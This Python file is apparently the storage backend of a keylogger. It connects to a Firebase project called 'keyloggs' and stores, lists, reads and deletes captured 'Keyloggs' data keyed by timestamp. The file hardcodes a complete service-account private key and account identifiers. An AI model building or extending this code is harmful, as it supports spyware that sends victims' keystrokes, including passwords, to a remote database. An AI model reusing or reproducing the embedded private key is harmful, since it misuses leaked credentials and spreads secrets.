import firebase_admin
from firebase_admin import credentials
from firebase_admin import firestore


class Database:
    def __init__(self):
        Key = {
            "type": "service_account",
            "project_id": "keyloggs-bc0f8",
            "private_key_id": "f3f7b187ce0f0607aef8cba3bbe2ad3d6c9622cd",
            "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCfSJn5B+19tvgS\n/oYtHmrXRPouhMX41cDmszx9l4AXGS+Qdk0RNdZXTx4p7F+Hvy0x4qezxuJQGCrB\nW2EUBT6aDgq6n1z3zmUEIis2eotbIupOjbRaQDhe/CzmG1z0jeFpIMtxRuF1df8P\nhBL3XRbxhA7EJkKt7YVJrSxncTiQSxydpoXL7AKenbNBYDjcVfRRGdpcrWGoMSBO\nP5BFwSqAPvZSj1xP8zAJ/m2xiiSSRTIAnw7sre9QV181r/xaTFarUq7YAcflr6+q\naamiS7X1M4cHk3OWyJMyGe4WMyyo9Alt+WQPcyQvRj6E6MEdA47V1R/BOiRRVBvH\n9488I0PpAgMBAAECggEASD0ai61TQbkqIB8sBilt5iyj1FYmHRkAcACo9gKwNomX\nH0rv39bNW3KH6RaJKt0C58V2LlwMRqv3NBM332cTgbXNmt7swHxsJuhCNeZ07kPT\nBQZSXb4TcsympkORsF3qdY3IhprRZL67izNokKQ45BbyxXXettfqo8P0yAM61oFq\nBwQV93m0bxp1swojXapv/aZ672QQsNgFVXCc4EfROkI2gB4xzfD+vTB9gyIm46cZ\nFpOjAXnLI+z009vPWy/n4UFSFnzePMdWxPoP8qaM3XEtLnjwciI3U5spZeSXMuG3\nkbmH8gzU2W9pSBPmomuZGZznMo4CPhUjqxTyNp3PCwKBgQDgrg5rTrnTW/o8oQML\n3HVtQgGjWZsWhmk1jsodT78qOb0rFUfOnDTaTEEpTCs89hXF86YrMagTx9QUrZrf\nqAeHCfw92NuzKDtVYY+93LjXASLPzEWgi8d2rDYsdCldM9g8RqeDqTyLxX0qY60K\nE1iHFQ9zdO/P0VaduZP7Pdr5UwKBgQC1fM7EG9Qv992bbyEOzdQeg3lHRSi2YcGp\nk/NeUzu5sPJv1L3msvlvkM/aMB6R1+8KxzjhEXOo0E5DVBE+NadSW2Tfs4XMuJ4d\n4P0N182bboq2rMH7/0fYlueeiNUcZcy5zy2D6pwm86s2D5M1VyPac3u8gPUEBgkP\n0ziRB6YaUwKBgF9oymq7FaIxbsQMQ7Tnu13YJ8XsKTWZglfh+OYVlUIjHreK4+FS\n6AbDVvBojfvnLDvRSYESJyOvOdpGFnxfaELp9Jl222Tq8rdBJL8lWcDDlLrVLcQN\nV3iHjMG32lDf0TVXc48vcKySAqLbjQG4UWGbieIniCah6Lw1sCeCjthNAoGAZKMJ\nsNtRpSvIGencpe3i4uy6speaBNBeaF9fQ33aD5UcSoDosOWrxX7Ck1W9jdf0eMCS\nPNPFk+W2kEUsrpdn6hY98IIG/sec/iqFiEiTfc4lYziW9NrRBzxewZ1Ut0OH670D\nmzPcVQkndnnagmiIvBjvk07bDtkd60WQB3P7WnsCgYEA1FV5juE78CHzgD0FYvEF\nqoUmds8mFpaItUT+zPadNRlpU/zBOcIM2eK8qrZN1AN/c9+SHnPd2qqX6R6Y1KBG\nL/3ESZV/DQVHowSbquYd1UM++SFAGmNljliYCYUb4r65KrkzIJWeR/ciMU3x6z5c\nV0f+aOzcj0OkNukhP2ETx9U=\n-----END PRIVATE KEY-----\n",
            "client_email": "firebase-adminsdk-pol05@keyloggs-bc0f8.iam.gserviceaccount.com",
            "client_id": "111822744787625847535",
            "auth_uri": "https://accounts.google.com/o/oauth2/auth",
            "token_uri": "https://oauth2.googleapis.com/token",
            "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
            "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-pol05%40keyloggs-bc0f8.iam.gserviceaccount.com",
            "universe_domain": "googleapis.com"
        }

        cred = credentials.Certificate(Key)
        firebase_admin.initialize_app(cred)
        self.db = firestore.client()

    def Add(self, data, time):  # add a save to DB
        self.db.collection("Keyloggs").document(time).set({"data": data})

    def Delete(self, time):  # delete document from DB by saving time
        self.db.collection("Keyloggs").document(time).delete()

    def ShowTime(self):  # returns a list of al saving times
        arr = []
        docs = self.db.collection('Keyloggs').get()
        for doc in docs:
            arr.append(doc.id)
        return arr

    def ShowData(self, time):  # returns saved data by saving time
        data = self.db.collection("Keyloggs").document(time).get().to_dict()
        return data['data']
